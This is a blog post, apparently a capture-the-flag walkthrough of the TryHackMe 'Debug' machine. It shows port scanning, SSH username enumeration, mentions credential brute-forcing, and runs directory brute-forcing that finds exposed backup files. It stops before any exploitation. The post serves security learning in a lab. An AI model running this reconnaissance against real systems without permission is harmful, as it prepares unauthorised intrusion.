<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>Debug - TryHackMe - THM Walkthrough :: Umar_0x01 â€“ Pentester | Programmer | Your average sakurity guy ( Í¡~ ÍœÊ– Í¡Â°)</title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Debug - THM  IP: 10.10.51.225
 Enumeration We can scan the host using rustscan (like nmap; but faster!) for open ports:
rustscan -a 10.10.51.225 --timeout 5000 --tries 2 --ulimit 5000 -- -sC -sV  -a specifies the Host IP address --timeout specifies the timeout before saying the port is closed --tries how many times to try and connect to the port --ulimit specifies how many sockets to open at a time -- for passing arguments for nmap -sC -sV nmap arguments telling rustscan to run default scripts and version fingerprinting  Scan results:"/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://umar0x01.sh/post/debug-thm/" />





<link rel="stylesheet" href="https://umar0x01.sh/assets/style.css">

<link rel="stylesheet" href="https://umar0x01.sh/style.css">


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://umar0x01.sh/img/apple-touch-icon-144-precomposed.png">
<link rel="shortcut icon" href="https://umar0x01.sh/img/favicon.png">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Debug - TryHackMe - THM Walkthrough"/>
<meta name="twitter:description" content="Walkthrough of the machine Debug on TryHackMe - https://tryhackme.com/room/debug"/>



<meta property="og:title" content="Debug - TryHackMe - THM Walkthrough" />
<meta property="og:description" content="Walkthrough of the machine Debug on TryHackMe - https://tryhackme.com/room/debug" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://umar0x01.sh/post/debug-thm/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2021-04-03T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2021-04-03T00:00:00&#43;00:00" />








<link rel="apple-touch-icon" sizes="180x180" href="/img/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/img/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/img/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/img/safari-pinned-tab.svg" color="#5bbad5">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff">




  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
</svg>
</span>
    <span class="logo__text">$ cd /home/umar_0x01/</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/anime">Anime</a></li>
        
      
        
          <li><a href="/archive">Archive</a></li>
        
      
        
          <li><a href="https://pentestlabs.gitbook.io">PentestLabs</a></li>
        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/anime">Anime</a></li>
      
    
      
        <li><a href="/archive">Archive</a></li>
      
    
      
        <li><a href="https://pentestlabs.gitbook.io">PentestLabs</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title"><a href="https://umar0x01.sh/post/debug-thm/">Debug - TryHackMe - THM Walkthrough</a></h1>
    <div class="post-meta">
      
        <span class="post-date">
          2021-04-03
        </span>

        
          
        
      

      <span class="post-author">â€” Written by Umar_0x01</span>
      
    </div>

    

    
      <figure class="post-cover">
        
          <img src="https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403143158.png" alt="Debug - TryHackMe - THM Walkthrough" />
        

        
      </figure>
    

    <div class="post-content">
      
      <h1 id="debug---thm">Debug - THM</h1>
<hr>
<p><strong>IP:</strong> 10.10.51.225</p>
<hr>
<h3 id="enumeration">Enumeration</h3>
<p>We can scan the host using <a href="https://github.com/RustScan/RustScan">rustscan</a> (like nmap; but faster!) for open ports:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rustscan -a 10.10.51.225 --timeout <span style="color:#ae81ff">5000</span> --tries <span style="color:#ae81ff">2</span> --ulimit <span style="color:#ae81ff">5000</span> -- -sC -sV
</code></pre></div><ul>
<li><code>-a</code> specifies the Host IP address</li>
<li><code>--timeout</code> specifies the timeout before saying the port is closed</li>
<li><code>--tries</code> how many times to try and connect to the port</li>
<li><code>--ulimit</code> specifies how many sockets to open at a time</li>
<li><code>--</code> for passing arguments for nmap</li>
<li><code>-sC -sV</code> nmap arguments telling rustscan to run default scripts and version fingerprinting</li>
</ul>
<p>Scan results:</p>
<p><img src="/img/debug-thm/Pasted%20image%2020210403130608.png" alt=""></p>
<hr>
<p>Alright, so, we&rsquo;ve found 2 open ports. 22 and 80.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">â”Œâ”€â”€<span style="color:#f92672">(</span>rootðŸ’€b0x<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Downloads<span style="color:#f92672">]</span>                                                                                                                                                                               <span style="color:#f92672">[</span>95/999<span style="color:#f92672">]</span>
â””â”€# rustscan -a 10.10.51.225 --timeout <span style="color:#ae81ff">5000</span> --tries <span style="color:#ae81ff">2</span> --ulimit <span style="color:#ae81ff">5000</span> -- -sC -sV   
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.                                                 
| <span style="color:#f92672">{}</span>  <span style="color:#f92672">}</span>| <span style="color:#f92672">{</span> <span style="color:#f92672">}</span> |<span style="color:#f92672">{</span> <span style="color:#f92672">{</span>__ <span style="color:#f92672">{</span>_   _<span style="color:#f92672">}{</span> <span style="color:#f92672">{</span>__  /  ___<span style="color:#f92672">}</span> / <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\ </span>|  <span style="color:#e6db74">`</span>| |
| .-. <span style="color:#ae81ff">\|</span> <span style="color:#f92672">{</span>_<span style="color:#f92672">}</span> |.-._<span style="color:#f92672">}</span> <span style="color:#f92672">}</span> | |  .-._<span style="color:#f92672">}</span> <span style="color:#f92672">}</span><span style="color:#ae81ff">\ </span>    <span style="color:#f92672">}</span>/  /<span style="color:#ae81ff">\ </span> <span style="color:#ae81ff">\|</span> |<span style="color:#ae81ff">\ </span> |
<span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39; `-&#39;</span><span style="color:#e6db74">`</span>-----<span style="color:#e6db74">&#39;`----&#39;</span>  <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;  `----&#39;</span>  <span style="color:#e6db74">`</span>---<span style="color:#e6db74">&#39; `-&#39;</span>  <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;`-&#39;</span> <span style="color:#e6db74">`</span>-<span style="color:#960050;background-color:#1e0010">&#39;</span>
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span> The config file is expected to be at <span style="color:#e6db74">&#34;/root/.rustscan.toml&#34;</span>
<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span> Automatically increasing ulimit value to 5000.
Open 10.10.51.225:22
Open 10.10.51.225:80
<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span> Starting Script<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> Script to be run Some<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;nmap -vvv -p {{port}} {{ip}}&#34;</span><span style="color:#f92672">)</span>

<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span> Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-04-03 13:04 PKT
NSE: Loaded <span style="color:#ae81ff">153</span> scripts <span style="color:#66d9ef">for</span> scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
Initiating NSE at 13:04
Completed NSE at 13:04, 0.00s elapsed
NSE: Starting runlevel <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
Initiating NSE at 13:04
Completed NSE at 13:04, 0.00s elapsed
NSE: Starting runlevel <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
Initiating NSE at 13:04
Completed NSE at 13:04, 0.00s elapsed
Initiating Ping Scan at 13:04
Scanning 10.10.51.225 <span style="color:#f92672">[</span><span style="color:#ae81ff">4</span> ports<span style="color:#f92672">]</span>
Completed Ping Scan at 13:04, 0.34s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
Initiating Parallel DNS resolution of <span style="color:#ae81ff">1</span> host. at 13:04
Completed Parallel DNS resolution of <span style="color:#ae81ff">1</span> host. at 13:04, 0.01s elapsed
DNS resolution of <span style="color:#ae81ff">1</span> IPs took 0.01s. Mode: Async <span style="color:#f92672">[</span><span style="color:#75715e">#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span>
Initiating SYN Stealth Scan at 13:04
Scanning 10.10.51.225 <span style="color:#f92672">[</span><span style="color:#ae81ff">2</span> ports<span style="color:#f92672">]</span>
Discovered open port 80/tcp on 10.10.51.225
Discovered open port 22/tcp on 10.10.51.225
Completed SYN Stealth Scan at 13:04, 0.25s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">2</span> total ports<span style="color:#f92672">)</span>
Initiating Service scan at 13:04
Scanning <span style="color:#ae81ff">2</span> services on 10.10.51.225
Completed Service scan at 13:05, 6.52s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">2</span> services on <span style="color:#ae81ff">1</span> host<span style="color:#f92672">)</span>
NSE: Script scanning 10.10.51.225.
NSE: Starting runlevel <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
Initiating NSE at 13:05
Completed NSE at 13:05, 6.38s elapsed                                                                    
NSE: Starting runlevel <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.                                                                    
Initiating NSE at 13:05                                                                                  
Completed NSE at 13:05, 0.82s elapsed                                                                    
NSE: Starting runlevel <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
Initiating NSE at 13:05                 
Completed NSE at 13:05, 0.00s elapsed   
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.51.225       
Host is up, received reset ttl <span style="color:#ae81ff">60</span> <span style="color:#f92672">(</span>0.28s latency<span style="color:#f92672">)</span>.
Scanned at 2021-04-03 13:04:58 PKT <span style="color:#66d9ef">for</span> 14s                                                               

PORT   STATE SERVICE REASON         VERSION                                                              
22/tcp open  ssh     syn-ack ttl <span style="color:#ae81ff">60</span> OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey:      
|   <span style="color:#ae81ff">2048</span> 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDar9Wvsxi0NTtlrjfNnap7o6OD9e/Eug2nZF18xx17tNZC/iVn5eByde27ZzR4Gf10FwleJzW5B7ieEThO3Ry5/kMZYbobY2nI8F3s20R8+sb6IdWDL4NIkFPqsDudH3LORxECx0DtwNdqgMgqeh/fCys1BzU2v2MvP5alraQmX
81h1AMDQPTo9nDHEJ6bc4Tt5NyoMZZSUXDfJRutsmt969AROoyDsoJOrkwdRUmYHrPqA5fvLtWsWXHYKGsWOPZSe0HIq4wUthMf65RQynFQRwErrJlQmOIKjMV9XkmWQ8c/DqA1h7xKtbfeUYa9nEfhO4HoSkwS0lCErj+l9p8h
|   <span style="color:#ae81ff">256</span> 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA7IA5s8W9jhxGAF1s4Q4BNSu1A52E+rSyFGBYdecgcJJ/sNZ3uL6sjZEsAfJG83m22c0HgoePkuWrkdK2oRnbs<span style="color:#f92672">=</span>
|   <span style="color:#ae81ff">256</span> 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da:cd:fc:67 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGXyfw0mC4ho9k8bd+n0BpaYrda6qT2eI1pi8TBYXKMb
80/tcp open  http    syn-ack ttl <span style="color:#ae81ff">60</span> Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
| http-methods:        
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
                                                    
NSE: Script Post-scanning.
NSE: Starting runlevel <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
Initiating NSE at 13:05      
Completed NSE at 13:05, 0.00s elapsed
NSE: Starting runlevel <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.                                                                    
Initiating NSE at 13:05                                                                                  
Completed NSE at 13:05, 0.00s elapsed                                                                    
NSE: Starting runlevel <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.                                                                    
Initiating NSE at 13:05             
Completed NSE at 13:05, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.76 seconds      
           Raw packets sent: <span style="color:#ae81ff">6</span> <span style="color:#f92672">(</span>240B<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>128B<span style="color:#f92672">)</span>

</code></pre></div><hr>
<h3 id="ssh-port-22">SSH (Port 22)</h3>
<p>Let&rsquo;s go with the waterfall mechanism and first enumerate port 22. We can try credentials bruteforcing using <a href="https://github.com/1N3/BruteX">BruteX</a> and check the version for any vulnerabilities which are public and exploitable.</p>
<p>From googling the exact banner/version, we can see that the specific version is vulnerable to username enumeration</p>
<p><img src="/img/debug-thm/Pasted%20image%2020210403132341.png" alt=""></p>
<p>&ndash;</p>
<p>Let&rsquo;s try and do it using metasploit&rsquo;s module.</p>
<p>We can search for the module using <code>search</code> with an filter of <code>port:22</code> for only searching for everything written for SSH/Port22 with enum</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">search port:22 ssh_enum
</code></pre></div><p><img src="/img/debug-thm/Pasted%20image%2020210403132441.png" alt=""></p>
<p>&ndash;</p>
<p>Let&rsquo;s run it.</p>
<p><img src="/img/debug-thm/Pasted%20image%2020210403132511.png" alt=""></p>
<p>&ndash;</p>
<p>We can see that it enumerated the user root and can probably guess the password will be something really long. Let&rsquo;s goto port 80 for now and we&rsquo;ll come back to SSH if we need something.</p>
<hr>
<h3 id="http-port-80">HTTP (Port 80)</h3>
<p>Let&rsquo;s browse the application to get an idea in which programming language it was written, what&rsquo;s it&rsquo;s using as it&rsquo;s backend server, etc.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">http://10.10.51.225/
</span></code></pre></div><p><img src="/img/debug-thm/Pasted%20image%2020210403132639.png" alt=""></p>
<p>So, we get meeted with Apache2&rsquo;s default installation page. Let&rsquo;s try and see if <code>/robots.txt</code> has something in it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">http://10.10.51.225/robots.txt
</span></code></pre></div><p><img src="/img/debug-thm/Pasted%20image%2020210403132759.png" alt=""></p>
<p>Sadly, it doesn&rsquo;t exist either.</p>
<p>&ndash;</p>
<p>We can now utilize <a href="https://github.com/OJ/gobuster">gobuster</a> or <a href="https://github.com/maurosoria/dirsearch">dirsearch</a> to enumerate the hidden directories hosted on the web application.</p>
<p>I&rsquo;ll use <code>dirsearch</code> to save some time downloading and setting up <code>gobuster</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 dirsearch.py -u http://10.10.51.225 -e all -t <span style="color:#ae81ff">100</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">â”Œâ”€â”€<span style="color:#f92672">(</span>rootðŸ’€b0x<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tools/dirsearch<span style="color:#f92672">]</span>
â””â”€# python3 dirsearch.py -u http://10.10.51.225 -e all -t <span style="color:#ae81ff">100</span>                                                                                                                                                  <span style="color:#ae81ff">1</span> â¨¯
/mnt/hgfs/tools/dirsearch/thirdparty/requests/__init__.py:91: RequestsDependencyWarning: urllib3 <span style="color:#f92672">(</span>1.26.2<span style="color:#f92672">)</span> or chardet <span style="color:#f92672">(</span>4.0.0<span style="color:#f92672">)</span> doesn<span style="color:#e6db74">&#39;t match a supported version!
</span><span style="color:#e6db74">  warnings.warn(&#34;urllib3 ({}) or chardet ({}) doesn&#39;</span>t match a supported <span style="color:#e6db74">&#34;
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">  _|. _ _  _  _  _ _|_    v0.4.1
</span><span style="color:#e6db74"> (_||| _) (/_(_|| (_| )
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">Extensions: all | HTTP method: GET | Threads: 100 | Wordlist size: 8948
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">Error Log: /mnt/hgfs/tools/dirsearch/logs/errors-21-04-03_13-30-02.log
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">Target: http://10.10.51.225/
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">Output File: /mnt/hgfs/tools/dirsearch/reports/10.10.51.225/_21-04-03_13-30-03.txt
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">[13:30:03] Starting: 
</span><span style="color:#e6db74">[13:30:16] 403 -  277B  - /.ht_wsr.txt
</span><span style="color:#e6db74">[13:30:17] 403 -  277B  - /.htaccessOLD
</span><span style="color:#e6db74">[13:30:17] 403 -  277B  - /.htaccess_orig
</span><span style="color:#e6db74">[13:30:17] 403 -  277B  - /.htaccess_sc
</span><span style="color:#e6db74">[13:30:17] 403 -  277B  - /.htaccessBAK
</span><span style="color:#e6db74">[13:30:17] 403 -  277B  - /.htaccess_extra
</span><span style="color:#e6db74">[13:30:17] 403 -  277B  - /.htaccessOLD2
</span><span style="color:#e6db74">[13:30:17] 403 -  277B  - /.htm
</span><span style="color:#e6db74">[13:30:17] 403 -  277B  - /.htpasswd_test
</span><span style="color:#e6db74">[13:30:17] 403 -  277B  - /.html
</span><span style="color:#e6db74">[13:30:17] 403 -  277B  - /.httr-oauth
</span><span style="color:#e6db74">[13:30:17] 403 -  277B  - /.htpasswds
</span><span style="color:#e6db74">[13:30:18] 403 -  277B  - /.htaccess.sample
</span><span style="color:#e6db74">[13:30:19] 403 -  277B  - /.htaccess.save
</span><span style="color:#e6db74">[13:30:19] 403 -  277B  - /.htaccess.bak1
</span><span style="color:#e6db74">[13:30:19] 403 -  277B  - /.htaccess.orig
</span><span style="color:#e6db74">[13:30:20] 403 -  277B  - /.php3
</span><span style="color:#e6db74">[13:30:21] 403 -  277B  - /.php
</span><span style="color:#e6db74">[13:30:35] 301 -  313B  - /backup  -&gt;  http://10.10.51.225/backup/
</span><span style="color:#e6db74">[13:30:36] 200 -    2KB - /backup/
</span><span style="color:#e6db74">[13:30:45] 200 -   11KB - /index.html
</span><span style="color:#e6db74">[13:30:46] 301 -  317B  - /javascript  -&gt;  http://10.10.51.225/javascript/
</span><span style="color:#e6db74">[13:30:46] 200 -    6KB - /index.php
</span><span style="color:#e6db74">[13:30:46] 200 -    6KB - /index.php/login/
</span><span style="color:#e6db74">[13:31:02] 200 -    2KB - /readme.md
</span><span style="color:#e6db74">[13:31:03] 403 -  277B  - /server-status/
</span><span style="color:#e6db74">[13:31:03] 403 -  277B  - /server-status
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">Task Completed
</span><span style="color:#e6db74">
</span></code></pre></div><p><img src="/img/debug-thm/Pasted%20image%2020210403133131.png" alt=""></p>
<p>&ndash;</p>
<p>Alright, we can see <code>/backup/</code> directory and <code>/readme.md</code> which also seems kinda interesting. Let&rsquo;s visit these and see what&rsquo;s hosted in them.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">http://10.10.51.225/readme.md
</span></code></pre></div><p>Let&rsquo;s cURL it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$~ curl -i http://10.10.51.225/readme.md

<span style="color:#75715e"># Welcome to Base                 </span>
A super simple, responsive framework built to work on mobile devices, tablets, netbooks and desktop computers.

<span style="color:#75715e">## Reasons to use base for your next web project</span>
<span style="color:#75715e">### Responsive Design</span>
Built <span style="color:#66d9ef">for</span> all devices big and small, base has got you covered.

<span style="color:#75715e">### Foundation Styles</span>
Custom styles <span style="color:#66d9ef">for</span> headings, tables, blockquotes forms and much more.

<span style="color:#75715e">### Accessibility in mind</span>
Works with screen readers in mind and has JS fallbacks.

<span style="color:#75715e">### Easy to learn</span>
Well commented CSS to ensure your implementation is a breeze.

<span style="color:#75715e">### Cross-Browser</span>
Covers IE7+ and modern browsers such as Chrome, Firefox and Opera.

<span style="color:#75715e">### Base is Awesome!</span>
Preview the <span style="color:#f92672">[</span>demo page<span style="color:#f92672">](</span>http://matthewhartman.github.com/base/demo/<span style="color:#f92672">)</span> to see the Base Framework in all its glory! :<span style="color:#f92672">)</span>


<span style="color:#75715e">## Repo Contents</span>
1. readme.md - Feel free to delete this! ;<span style="color:#f92672">)</span>
2. index.html - An example page with Base in action
3. style.css - Base stylesheet including styles <span style="color:#66d9ef">for</span> headings, tables, body content, etc
4. default.js - Base javascript file to get you started

Base was built by Matthew Hartman <span style="color:#f92672">(</span>@hartmanmatthew<span style="color:#f92672">)</span>, a passionate front end developer based in Melbourne, Australia.

<span style="color:#75715e">## Thank You / Credits</span>
- Mark Otto <span style="color:#f92672">(</span>@mdo<span style="color:#f92672">)</span> &amp; Jacob Thornton <span style="color:#f92672">(</span>@fat<span style="color:#f92672">)</span> <span style="color:#66d9ef">for</span> some base styles taken from BootStrap
- Nicolas Gallagher <span style="color:#f92672">(</span>@necolas<span style="color:#f92672">)</span> <span style="color:#66d9ef">for</span> the Micro ClearFix :<span style="color:#f92672">)</span>

</code></pre></div><p>We can see that it returns README.md source of some repository, maybe we can explore it later?</p>
<p>For now, let&rsquo;s move to the <code>/backup/</code> folder</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">http://10.10.51.225/backup/
</span></code></pre></div><p><img src="/img/debug-thm/Pasted%20image%2020210403133609.png" alt=""></p>
<p>The <code>/backup/</code> directory contains interesting .bak files, let&rsquo;s <code>cURL</code> those one by one and see their source code.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">â”Œâ”€â”€<span style="color:#f92672">(</span>rootðŸ’€b0x<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tools/dirsearch<span style="color:#f92672">]</span>
â””â”€# curl -i http://10.10.51.225/backup/index.html.bak                                                    
HTTP/1.1 <span style="color:#ae81ff">200</span> OK                                                                                          
Date: Sat, <span style="color:#ae81ff">03</span> Apr <span style="color:#ae81ff">2021</span> 08:36:44 GMT                                                                      
Server: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>                                                                           
Last-Modified: Wed, <span style="color:#ae81ff">10</span> Mar <span style="color:#ae81ff">2021</span> 01:10:05 GMT                                                             
ETag: <span style="color:#e6db74">&#34;2c39-5bd2453bf4a05&#34;</span>                                                                               
Accept-Ranges: bytes                                                                                     
Content-Length: <span style="color:#ae81ff">11321</span>                                                                                    
Content-Type: application/x-trash                                                                        
                                                    
                                                    
&lt;!DOCTYPE html PUBLIC <span style="color:#e6db74">&#34;-//W3C//DTD XHTML 1.0 Transitional//EN&#34;</span> <span style="color:#e6db74">&#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&#34;</span>&gt;                                                                                          
&lt;html xmlns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/xhtml&#34;</span>&gt;
  &lt;!--
    Modified from the Debian original <span style="color:#66d9ef">for</span> Ubuntu
    Last updated: 2014-03-19
    See: https://launchpad.net/bugs/1288690
  --&gt;
  &lt;head&gt;
    &lt;meta http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Type&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html; charset=UTF-8&#34;</span> /&gt;
    &lt;title&gt;Apache2 Ubuntu Default Page: It works&lt;/title&gt;
    &lt;style type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> media<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;screen&#34;</span>&gt;
  * <span style="color:#f92672">{</span>
    margin: 0px 0px 0px 0px;
    padding: 0px 0px 0px 0px;
  <span style="color:#f92672">}</span>

  body, html <span style="color:#f92672">{</span>
    padding: 3px 3px 3px 3px;

    background-color: <span style="color:#75715e">#D8DBE2;</span>

    font-family: Verdana, sans-serif;
    font-size: 11pt;
    text-align: center;
  <span style="color:#f92672">}</span>

  div.main_page <span style="color:#f92672">{</span>

</code></pre></div><p>We can see that the page also points to default Apache installation page. Let&rsquo;s try <code>.php.bak</code> file now.</p>
<p>I&rsquo;ll be downloading and analysing it in Sublime text (text editor).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">â”Œâ”€â”€<span style="color:#f92672">(</span>rootðŸ’€b0x<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tools/dirsearch<span style="color:#f92672">]</span>
â””â”€# curl http://10.10.51.225/backup/index.php.bak -O
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
<span style="color:#ae81ff">100</span>  <span style="color:#ae81ff">6399</span>  <span style="color:#ae81ff">100</span>  <span style="color:#ae81ff">6399</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">10438</span>      <span style="color:#ae81ff">0</span> --:--:-- --:--:-- --:--:-- <span style="color:#ae81ff">10438</span>
                                                                                                                     
â”Œâ”€â”€<span style="color:#f92672">(</span>rootðŸ’€b0x<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tools/dirsearch<span style="color:#f92672">]</span>
â””â”€# 
                                                                                                    
â”Œâ”€â”€<span style="color:#f92672">(</span>rootðŸ’€b0x<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tools/dirsearch<span style="color:#f92672">]</span>
â””â”€# head index.php.bak    
&lt;!doctype html&gt;
&lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;no-js&#34;</span>&gt;
&lt;head&gt;
